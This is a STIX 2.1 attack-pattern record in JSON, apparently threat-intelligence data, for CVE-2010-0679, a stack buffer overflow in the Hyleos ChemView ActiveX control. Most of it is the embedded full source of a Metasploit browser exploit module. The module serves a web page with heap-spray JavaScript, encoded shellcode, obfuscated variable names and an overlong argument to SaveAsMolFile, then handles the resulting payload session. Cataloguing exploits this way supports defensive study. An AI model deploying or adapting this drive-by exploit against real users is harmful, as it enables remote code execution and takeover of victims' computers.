{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--01b090c9-8dff-46b4-8cba-841d17527904",
    "created": "2024-08-14T16:41:17.727988Z",
    "modified": "2024-08-14T16:41:17.727992Z",
    "name": "Hyleos ChemView ActiveX Control Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow within version 1.9.5.1 of Hyleos ChemView (HyleosChemView.ocx). By calling the 'SaveAsMolFile' or 'ReadMolFile' methods with an overly long first argument, an attacker can overrun a buffer and execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hyleos_chemviewx_activex.rb",
            "external_id": "hyleos_chemviewx_activex.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0679"
        },
        {
            "source_name": "reference",
            "url": "http://www.security-assessment.com/files/advisories/2010-02-11_ChemviewX_Activex.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking # heap spray :-/\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Hyleos ChemView ActiveX Control Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow within version 1.9.5.1 of Hyleos\n        ChemView (HyleosChemView.ocx). By calling the 'SaveAsMolFile' or 'ReadMolFile' methods\n        with an overly long first argument, an attacker can overrun a buffer and execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Paul Craig <paul.craig[at]security-assessment.com>', # original discovery/advisory\n          'Dz_attacker <dz_attacker[at]hotmail.fr>', # original file format module\n          'jduck'   # converted HttpServer module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-0679' ],\n          [ 'OSVDB', '62276' ],\n          [ 'URL', 'http://www.security-assessment.com/files/advisories/2010-02-11_ChemviewX_Activex.pdf' ],\n          [ 'EDB', '11422' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0A0A0a0A, 'Offset' => 150 } ]\n        ],\n      'DisclosureDate' => '2010-02-10',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    clsid = \"C372350A-1D5A-44DC-A759-767FC553D96C\"\n    progid = \"HyleosChemView.HLChemView\"\n\n    methods = [ \"ReadMolFile\", \"SaveAsMolFile\" ]\n    method = methods[rand(methods.length)]\n    method = \"SaveAsMolFile\"\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # It may be possible to create a more robust exploit, however --\n    # 1. The control's base address has been shown to vary (seen at 0x1c90000 and 0x1d90000)\n    # 2. The buffer overflow does not appear to be entirely straight forward.\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(p.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    ret  \t  = Rex::Text.uri_encode([target.ret].pack('L'))\n    blocksize = 0x40000\n    fillto    = 300\n    offset \t  = target['Offset']\n\n    # Randomize the javascript variable names\n    chemview     = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n\n    content = %Q|<html>\n<object classid='clsid:#{clsid}' id='#{chemview}'></object>\n<script>\n#{j_shellcode}=unescape('#{shellcode}');\n#{j_nops}=unescape('#{nops}');\n#{j_headersize}=20;\n#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\nwhile(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\nwhile(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n#{j_memory}=new Array();\nfor(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n\nvar #{j_ret}='';\nfor(#{j_counter}=0;#{j_counter}<=#{offset};#{j_counter}++)#{j_ret}+=unescape('#{ret}');\n#{chemview}.#{method}(#{j_ret});\n</script>\n</html>|\n\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-02-10",
    "x_mitre_platforms": [
        "win'"
    ]
}